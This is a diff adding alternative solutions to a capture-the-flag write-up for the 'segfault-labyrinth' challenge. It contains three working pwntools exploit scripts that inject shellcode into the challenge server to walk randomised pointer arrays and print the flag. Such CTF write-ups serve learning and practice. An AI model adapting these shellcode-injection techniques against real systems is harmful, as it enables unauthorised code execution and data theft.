@@ -202,3 +202,193 @@ Output:
 [*] Closed connection to segfault-labyrinth.2022.ctfcompetition.com port 1337
 CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}
 ```
+
+## Alternative Solves
+
+### Alternative `exploit2.py`
+
+Same as described above, however with locations table append to payload vs. hardcoded and unrolled.  Payload is about 1/3 the size of the payload above.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+binary = context.binary = ELF('./challenge', checksec=False)
+
+if args.REMOTE:
+    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
+else:
+    p = process(binary.path)
+
+shellcode = asm(f'''
+mov rdi, 1
+mov rdx, 100
+mov rbx, 16
+loop:
+dec rbx
+lea rsi, [rip + locations]
+mov rsi, qword ptr [rsi + rbx*8]
+mov eax, {constants.SYS_write}
+syscall
+cmp rax, 100
+je end
+// test rbx, rbx
+jne loop
+end:
+xor rdi, rdi
+mov eax, {constants.SYS_exit}
+syscall
+locations:
+''')
+
+if args.D: print(disasm(shellcode))
+
+from ctypes import *
+glibc = cdll.LoadLibrary('libc.so.6')
+for i in range(9*16): glibc.rand()
+for i in range(16): shellcode += p64(glibc.rand() * 0x1000 + 0x10000)
+
+assert(len(shellcode) < 0x1000)
+p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
+p.send(shellcode)
+_ = p.recvline().decode().strip()
+p.close()
+print(_)
+```
+
+### Intended Solution `exploit3.py`
+
+The intended solution, as stated by the challenge author on Discord, is to leverage the only register (`rdi`) that is not reset [before shellcode execution] to navigate the labyrinth with `stat`.
+
+> I just assumed all registers were reset when I created my initial solve; checking the last 16 allocations seemed easy enough.
+
+The nested loops in the challenge binary create 10 arrays, each with 16 elements, one of which is a pointer (randomly selected) to the next array.  `rdi` points the first array; the last array has a pointer to the in-memory flag:
+
+```
+array: 0         1         2         3     .........     a
+-----------------------------------------------------------------------
+rdi -> 0    .--> 0    .--> 0    .--> 0               --> 0
+       1    |    1    |    1    |    1                   1
+       2    |    2    |    2    |    2                   2 ---> CTF{...
+       3    |    3    |    3    |    3                   3
+       4 ---'    4    |    4    |    4                   4
+       5         5    |    5    |    5                   5
+       6         6    |    6    |    6                   6
+       7         7    |    7    |    7     .........     7
+       8         8    |    8    |    8                   8
+       9         9    |    9 ---'    9                   9
+       a         a    |    a         a                   a
+       b         b    |    b         b ---               b
+       c         c    |    c         c                   c
+       d         d ---'    d         d                   d
+       e         e         e         e                   e
+       f         f         f         f                   f
+```
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+binary = context.binary = ELF('./segfault_labyrinth', checksec=False)
+
+if args.REMOTE:
+    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
+else:
+    p = process(binary.path)
+
+shellcode = asm(f'''
+mov r15, rdi
+mov r14, 10
+loop1:
+    dec r14
+    lea rdi, [rip + filename]
+    mov r13, 16
+    loop2:
+        dec r13
+        mov rsi, qword ptr [r15 + r13*8]
+        // need to skip over the 16 pointers for our stat buf
+        add rsi, 16*8
+        mov eax, {constants.SYS_stat}
+        syscall
+        test rax, rax
+        jne loop2
+    test r14, r14
+    je end
+    mov r15, qword ptr [r15 + r13*8]
+    jmp loop1
+end:
+mov rdi, 1
+mov rsi, qword ptr [r15 + r13*8]
+mov rdx, 100
+mov eax, {constants.SYS_write}
+syscall
+xor rdi, rdi
+mov eax, {constants.SYS_exit}
+syscall
+filename:
+''')
+
+if args.D: print(disasm(shellcode))
+shellcode += b'flag.txt'
+assert(len(shellcode) < 0x1000)
+p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
+p.send(shellcode)
+_ = p.recvline().decode().strip()
+p.close()
+print(_)
+```
+
+### Intended Solution Alternative (no `stat`) `exploit3.1.py`
+
+Same as above, but just using `write` and dealing with all the garbage:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+binary = context.binary = ELF('./segfault_labyrinth', checksec=False)
+
+if args.REMOTE:
+    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
+else:
+    p = process(binary.path)
+
+shellcode = asm(f'''
+mov r15, rdi
+mov rdi, 1
+mov rdx, 100
+mov r14, 10
+loop1:
+    dec r14
+    mov r13, 16
+    loop2:
+        dec r13
+        mov rsi, qword ptr [r15 + r13*8]
+        mov eax, {constants.SYS_write}
+        syscall
+        cmp rax, 100
+        jne loop2
+    test r14, r14
+    je end
+    mov r15, qword ptr [r15 + r13*8]
+    jmp loop1
+end:
+xor rdi, rdi
+mov eax, {constants.SYS_exit}
+syscall
+''')
+
+if args.D: print(disasm(shellcode))
+assert(len(shellcode) < 0x1000)
+p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
+p.send(shellcode)
+_ = p.recvall()[900:]
+_ = _[:_.find(b'\0')].decode().strip()
+p.close()
+print(_)
+```
+
+
